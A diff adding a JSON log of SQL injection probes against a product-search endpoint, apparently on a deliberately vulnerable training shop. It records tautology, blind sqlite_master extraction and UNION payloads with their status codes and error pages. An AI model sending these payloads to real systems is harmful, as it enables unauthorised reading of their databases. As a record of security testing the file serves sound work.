@@ -1,0 +1,72 @@
+[
+ {
+  "test": "base q=Apple",
+  "path": "/rest/products/search?q=Apple",
+  "status": 200,
+  "body_length": 921,
+  "preview": "{\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-10-05 00:44:34.891 +"
+ },
+ {
+  "test": "true-1: ' OR '1'='1",
+  "path": "/rest/products/search?q=%27%20OR%20%271%27=%271",
+  "status": 200,
+  "body_length": 16557,
+  "preview": "{\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-10-05 00:44:34.891 +"
+ },
+ {
+  "test": "false: ' OR 1=2",
+  "path": "/rest/products/search?q=%27%20OR%201=2",
+  "status": 200,
+  "body_length": 16557,
+  "preview": "{\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-10-05 00:44:34.891 +"
+ },
+ {
+  "test": "extract: first char of sqlite_master.sql > 50 (should be true\u2192all)",
+  "path": "/rest/products/search?q=%27%20OR%20ascii(substr((SELECT%20sql%20FROM%20sqlite_master%20LIMIT%201),1,1))>50/**/",
+  "status": 500,
+  "body_length": 956,
+  "preview": "<html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: no such function: ascii</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 100px;   f"
+ },
+ {
+  "test": "extract: table count > 5",
+  "path": "/rest/products/search?q=%27%20OR%20(SELECT%20count(*)%20FROM%20sqlite_master%20WHERE%20type='table')>5/**/",
+  "status": 500,
+  "body_length": 982,
+  "preview": "<html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;table&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80"
+ },
+ {
+  "test": "extract: 'users' table exists",
+  "path": "/rest/products/search?q=%27%20OR%20(SELECT%20count(*)%20FROM%20sqlite_master%20WHERE%20name='Users')>0/**/",
+  "status": 500,
+  "body_length": 982,
+  "preview": "<html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;Users&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80"
+ },
+ {
+  "test": "extract: first table name starts with 'U'",
+  "path": "/rest/products/search?q=%27%20OR%20ascii(substr((SELECT%20name%20FROM%20sqlite_master%20WHERE%20type='table'%20LIMIT%201),1,1))=85/**/",
+  "status": 500,
+  "body_length": 982,
+  "preview": "<html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;table&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80"
+ },
+ {
+  "test": "extract: product count > 20",
+  "path": "/rest/products/search?q=%27%20OR%20(SELECT%20count(*)%20FROM%20Products)>20/**/",
+  "status": 200,
+  "body_length": 16557,
+  "preview": "{\"status\":\"success\",\"data\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"createdAt\":\"2026-10-05 00:44:34.891 +"
+ },
+ {
+  "test": "extract: count of names starting with A > 5",
+  "path": "/rest/products/search?q=%27%20OR%20(SELECT%20count(*)%20FROM%20Products%20WHERE%20name%20LIKE%27A%25%27)>5/**/",
+  "status": 500,
+  "body_length": 974,
+  "preview": "<html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;A&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80px 1"
+ },
+ {
+  "test": "union attempt: ' UNION SELECT 1,2,3,4 FROM sqlite_master--",
+  "path": "/rest/products/search?q=%27%20UNION%20SELECT%201,2,3,4%20FROM%20sqlite_master--%2F%2A",
+  "status": 500,
+  "body_length": 982,
+  "preview": "<html>   <head>     <meta charset='utf-8'>      <title>Error: SQLITE_ERROR: near &quot;UNION&quot;: syntax error</title>     <style>* {   margin: 0;   padding: 0;   outline: 0; }  body {   padding: 80"
+ }
+]
